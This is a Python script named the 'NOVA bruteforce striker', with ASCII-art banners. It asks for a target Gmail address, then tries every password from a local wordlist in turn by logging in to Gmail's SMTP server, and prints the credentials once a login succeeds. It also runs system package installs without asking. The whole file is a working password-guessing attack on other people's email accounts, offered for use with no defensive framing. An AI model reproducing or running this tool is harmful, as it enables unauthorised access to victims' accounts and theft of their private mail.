#     WELCOME
#  Author: $BASH
#    24.01.2019
import os as callmebitch
import time
import smtplib as smtp
callmebitch.system("clear")
callmebitch.system("apt-get update")
callmebitch.system("apt-get install figlet")
callmebitch.system("clear")
class color:
    yellow = '\033[0;33m'
    red = '\033[0;31m'
    blue = '\033[0;34m'
def nova():
     print("""
    ███▄▄▄▄    ▄██████▄   ▄█    █▄     ▄████████ 
    ███▀▀▀██▄ ███    ███ ███    ███   ███    ███ 
    ███   ███ ███    ███ ███    ███   ███    ███ 
    ███   ███ ███    ███ ███    ███   ███    ███ 
    ███   ███ ███    ███ ███    ███ ▀███████████ 
    ███   ███ ███    ███ ███    ███   ███    ███ 
    ███   ███ ███    ███ ███    ███   ███    ███ 
     ▀█   █▀   ▀██████▀   ▀██████▀    ███    █▀  
                   
        """)
def logo():
    callmebitch.system("clear")
    print(color.yellow + """                                                         
    ▀█████████▄     ▄████████    ▄████████    ▄█    █▄    
      ███    ███   ███    ███   ███    ███   ███    ███   
      ███    ███   ███    ███   ███    █▀    ███    ███   
     ▄███▄▄▄██▀    ███    ███   ███         ▄███▄▄▄▄███▄▄ 
    ▀▀███▀▀▀██▄  ▀███████████ ▀███████████ ▀▀███▀▀▀▀███▀  
      ███    ██▄   ███    ███          ███   ███    ███   
      ███    ███   ███    ███    ▄█    ███   ███    ███   
    ▄█████████▀    ███    █▀   ▄████████▀    ███    █▀    
                                                                                                      
              N        O         V          A
              ~*---*-*-~-________-~-*-*---*-~    """
     + color.blue + """                                       Hello welcome to the NOVA bruteforce striker.                                        
    """)
    time.sleep(4)
logo()
callmebitch.system("clear")
server = "smtp.gmail.com"
port = 587
nova()
eposta = input(color.red + """
 __[nova@striker]
| 
*----> Enter the target gmail adress.: """)
w = open("wordlist.txt","r")
denemesayisi = 0
while True:
    try:
        for parola in w:
            mail = smtp.SMTP(server,port)
            mail.ehlo()
            mail.starttls()
            mail.login(eposta,parola)
            print("""
                [yes] Successfully founded passaword and e-mail
                [E-MAIL]; %s
                [PASSAWORD]; %s
                            """ % (eposta, parola))
            mail.close()
            break
    except smtp.SMTPAuthenticationError:
        callmebitch.system("clear")
        denemesayisi += 1
        print("%s.) Tying again."%(denemesayisi))
        callmebitch.system("clear")
        continue
